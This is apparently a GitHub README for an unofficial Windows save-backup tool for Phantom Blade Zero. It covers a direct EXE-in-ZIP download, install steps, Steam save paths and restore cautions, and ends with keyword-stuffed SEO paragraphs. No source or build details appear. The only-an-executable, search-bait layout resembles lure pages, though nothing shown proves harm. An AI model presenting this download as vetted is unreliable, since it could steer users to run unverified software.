<p align="center">
  <img src="https://i.postimg.cc/d0PsDnSS/banner.png" alt="Phantom Blade Zero PBZero SaveVault Windows game companion" width="100%">
</p>

# PBZero SaveVault — Phantom Blade Zero Windows Companion

**Keep a clean copy of a run before the next decision.**

A save backup is most valuable the day before you need it. PBZero SaveVault focuses on a cautious Windows/Steam workflow for identifying Phantom Blade Zero save folders, keeping dated local copies and understanding what a restore can overwrite. This is a save-management companion, not a progression unlocker or an item editor.

**Platform:** Windows PC (Steam)  
**Game:** Phantom Blade Zero  
**Distribution:** GitHub Releases (ZIP archive with a Windows EXE)

## Download PBZero SaveVault for Windows

### **[⬇ Download Windows ZIP](../../releases/latest/download/Phantom-Blade-Zero-SaveVault-Windows.zip)**

[View all releases](../../releases)

The link above goes directly to the **Phantom-Blade-Zero-SaveVault-Windows.zip** asset attached to the latest published GitHub Release. The archive contains **PBZero-SaveVault.exe**. GitHub's automatically generated **Source code (zip)** is not the Windows application.

### Installation

1. Click **Download Windows ZIP** above.
2. Extract `Phantom-Blade-Zero-SaveVault-Windows.zip` to a folder you control.
3. Close Phantom Blade Zero before making changes to game-related files or backups.
4. Run `PBZero-SaveVault.exe` from the extracted archive and follow its interface.
5. Keep a separate backup of game saves and anything you modify.

> **File naming:** `Phantom-Blade-Zero-SaveVault-Windows.zip` is the stable release-asset name. `PBZero-SaveVault.exe` is the Windows executable inside the archive. The Release tag can change between versions without breaking the direct-download link.

## What PBZero SaveVault is for

For Steam on Windows, recent guides identify game saves beneath `PBZ\ProjectPBZ\Saved\SaveGames\Steam\<SteamID64>` within your Steam library. The Steam account folder may contain active and dated save data. Steam Cloud can also synchronize files, so a safe restore needs to consider what the game and cloud are doing.

| Focus | How to use it |
| --- | --- |
| **Find the correct save folder** | Use the game installation path, not a generic AppData guess, for the Steam edition. |
| **Keep dated backups** | Store copies outside the game and outside folders that Steam Cloud may synchronize. |
| **Plan safe restores** | Close the game, identify the account folder and check which files could be replaced. |
| **Prepare for NG+** | Save a known-good checkpoint before large narrative or loadout changes. |

## Getting started: a practical workflow

1. Download the Windows archive from the direct Release link and extract it.
2. Close Phantom Blade Zero and make sure Steam has finished any active synchronization.
3. Identify the correct Steam account save folder and verify that it contains your own files.
4. Copy the full account folder to a dated backup location outside the installation tree.
5. Before restoring, back up the current state again, then carefully compare timestamps and Steam Cloud status.

**Important:** never merge arbitrary `.sav` files from unknown sources or overwrite a live save while the game is running. A backup copy is not the same thing as a mod backup. If you use multiple Steam accounts or libraries, double-check which directory belongs to the current player.

## Steam save folders on Windows

A commonly documented location is:

```text
<Steam library>\steamapps\common\PBZ\ProjectPBZ\Saved\SaveGames\Steam\<SteamID64>\
```

The full account folder may contain active and older copies. Do not assume the current account can use files belonging to another account. Configuration settings may be stored under a different path such as `%LOCALAPPDATA%\ProjectPBZ\Saved\Config\Windows`.

**Before any restore:** close the game, copy the current folder into a new backup, inspect Steam Cloud state, and verify which data you are replacing. See the [Steam PC save location guide](https://www.bladezero.org/save/) for cross-referenced details.

## Troubleshooting and accuracy

- Use the Steam edition and your actual game build as reference points; console paths and interfaces can differ.
- If an item, quest or unlock is missing, check a source updated for your patch before assuming it is a bug.
- Keep separate copies of important saves. A companion tool should never be your only backup.
- If the Windows ZIP cannot be downloaded, confirm that the latest published GitHub Release has an attached asset with the **exact** name `Phantom-Blade-Zero-SaveVault-Windows.zip`.
- If Windows blocks an executable, check the file's provenance and security warnings; do not disable system protections simply to run it.

## Frequently asked questions

**Where is the Phantom Blade Zero save file location on PC?**

For the documented Steam Windows layout, inspect `<Steam library>\steamapps\common\PBZ\ProjectPBZ\Saved\SaveGames\Steam\<SteamID64>`. Confirm the actual folder on your machine.

**Are Steam saves stored under AppData?**

Guides describe the Steam game saves under the PBZ installation. Some game settings are stored elsewhere, including Local AppData; do not confuse settings with saves.

**Can Steam Cloud overwrite a restored save?**

Cloud synchronization can affect local data. Always copy the current folder first, and review sync prompts rather than assuming the newest timestamp is the desired version.

**Does SaveVault edit or unlock items?**

The project is designed around preserving existing local save copies, not modifying progression.

## Sources and scope

- [Phantom Blade Zero on Steam](https://store.steampowered.com/app/4115450/Phantom_Blade_Zero/)
- [Phantom Blade Zero collectibles and missables (PowerPyx)](https://www.powerpyx.com/phantom-blade-zero-collectibles-guide-100-completion)
- [Build and equipment rules](https://phantom-blade.wiki/builds/)

These links provide external game information. This repository is independent and does not bundle or redistribute their copyrighted maps, guides or game files. Exact item counts, balance data and quest conditions may change between patches.

*Unofficial community project. Not affiliated with S-GAME, Valve/Steam or any guide publisher. This project is a separate Windows companion and should not be confused with an official game update, in-game mod or developer-endorsed tool.*

---

## Phantom Blade Zero Save File Location and Windows Save Backup Guide

Looking for the **Phantom Blade Zero save file location** on PC? Steam installations normally keep game saves under the installed `PBZ` directory rather than directly in AppData. Find the correct account folder before making copies, and keep backups somewhere outside your Steam library.

### Phantom Blade Zero save manager for Windows

A practical **Phantom Blade Zero save manager** workflow involves identifying the active folder, storing dated versions and checking what a restore will replace. SaveVault is a companion for players who want to preserve their progress before experimenting with a new run or making a significant decision.

### Save backup before New Game Plus

If you are deciding between **Phantom Blade Zero new game plus** and finishing more side content, a safe manual backup helps preserve a known checkpoint. A file copy does not guarantee compatibility between patches or Steam accounts, so always verify the edition and game version.

### Steam Cloud, restore and missing saves

For **Phantom Blade Zero save backup**, **Phantom Blade Zero save restore** or missing local saves, check Steam Cloud status and the relevant `SteamID64` directory before replacing anything. Download the Windows Release ZIP using the direct link at the top; the archive name is stable across release tags.
